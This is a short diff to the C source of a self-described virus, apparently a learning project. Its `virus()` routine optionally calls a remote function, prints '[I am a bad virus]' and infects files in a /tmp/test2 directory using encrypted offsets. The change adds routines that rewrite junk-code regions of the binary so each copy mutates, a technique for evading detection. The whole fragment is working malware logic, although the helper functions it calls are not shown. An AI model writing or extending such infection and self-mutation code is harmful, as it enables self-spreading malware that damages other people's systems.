@@ -55,16 +55,27 @@ void do_infection(){
 	infect_dir("/tmp/test2", virus, virus_len, crypt_off, crypt_len, opt);
 }
 
-int virus(int ac, char **av){
-	//if (check_prop("test--not--exist") == FALSE)
-	//{
-	//	print("PROC TEST\n");
-	//	return TRUE;
-	//}
+int _replace_jmp_gb(Garbage g){
+	if (&bin_start + g.off + g.len >= bin_end) return FALSE;
 
+	unsigned char *p = ((unsigned char *)(&bin_start)) + g.off + 2;
+	int n = g.len - 2;
+	for (int i = 0; i < n; i++)
+		p[i] = 0x00;
+	return TRUE;
+}
+
+void change_garbage_code(){
+	for (int i = 0 ; i < garbage_table_len; i++){
+		_replace_jmp_gb(garbage_table[i]);
+	}
+}
+
+int virus(int ac, char **av){
 	if (opt.do_remote) remote();
  	if (opt.print_msg) println("[I am a bad virus]");
 
+	change_garbage_code();
 	do_infection();
 	return TRUE;
 }
